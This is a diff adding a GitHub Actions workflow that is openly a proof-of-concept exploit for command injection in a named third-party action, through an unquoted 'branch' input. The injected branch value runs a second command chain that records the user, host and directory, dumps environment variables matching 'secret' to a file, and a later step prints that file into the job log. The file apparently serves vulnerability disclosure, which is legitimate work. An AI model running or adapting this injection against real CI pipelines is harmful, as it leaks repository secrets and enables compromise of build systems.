@@ -1,0 +1,48 @@
+name: POC - Command Injection via branch input
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  exploit-branch:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: POC - Command Injection via branch input
+        uses: mongodb/push-to-artifact-repo@main
+        continue-on-error: true
+        with:
+          # Command injection via unquoted $INPUT_BRANCH in entrypoint.sh:19
+          # The branch value is used unquoted: --branch $INPUT_BRANCH
+          # Shell interprets ; as command separator, executing our injected commands
+          email: "poc-test@example.com"
+          name: "POC Tester"
+          branch: "main; echo '🚨 COMMAND INJECTION via branch input 🚨' > /tmp/branch-injection-poc.txt && echo 'Whoami:' $(whoami) >> /tmp/branch-injection-poc.txt && echo 'Hostname:' $(hostname) >> /tmp/branch-injection-poc.txt && echo 'PWD:' $(pwd) >> /tmp/branch-injection-poc.txt && echo 'Date:' $(date) >> /tmp/branch-injection-poc.txt && echo 'ENV vars with secrets:' >> /tmp/branch-injection-poc.txt && env | grep -i secret >> /tmp/branch-injection-poc.txt || true; echo injected"
+          source: "./source"
+          # Using a dummy repo URL - the action will fail but injection executes first
+          toRepo: "https://github.com/nonexistent/repo.git"
+
+      - name: Verify Injection - branch input
+        shell: bash
+        run: |
+          echo "============================================"
+          echo "VERIFICATION: Command Injection via 'branch' input"
+          echo "============================================"
+          if [ -f /tmp/branch-injection-poc.txt ]; then
+            echo "✅ VULNERABILITY CONFIRMED!"
+            echo ""
+            echo "The following commands were executed via injection:"
+            echo "---"
+            cat /tmp/branch-injection-poc.txt
+            echo "---"
+            echo ""
+            echo "📍 Vulnerable code location: entrypoint.sh:19"
+            echo "   --branch \$INPUT_BRANCH  (unquoted variable)"
+          else
+            echo "❌ Injection file not found - check action logs"
+          fi
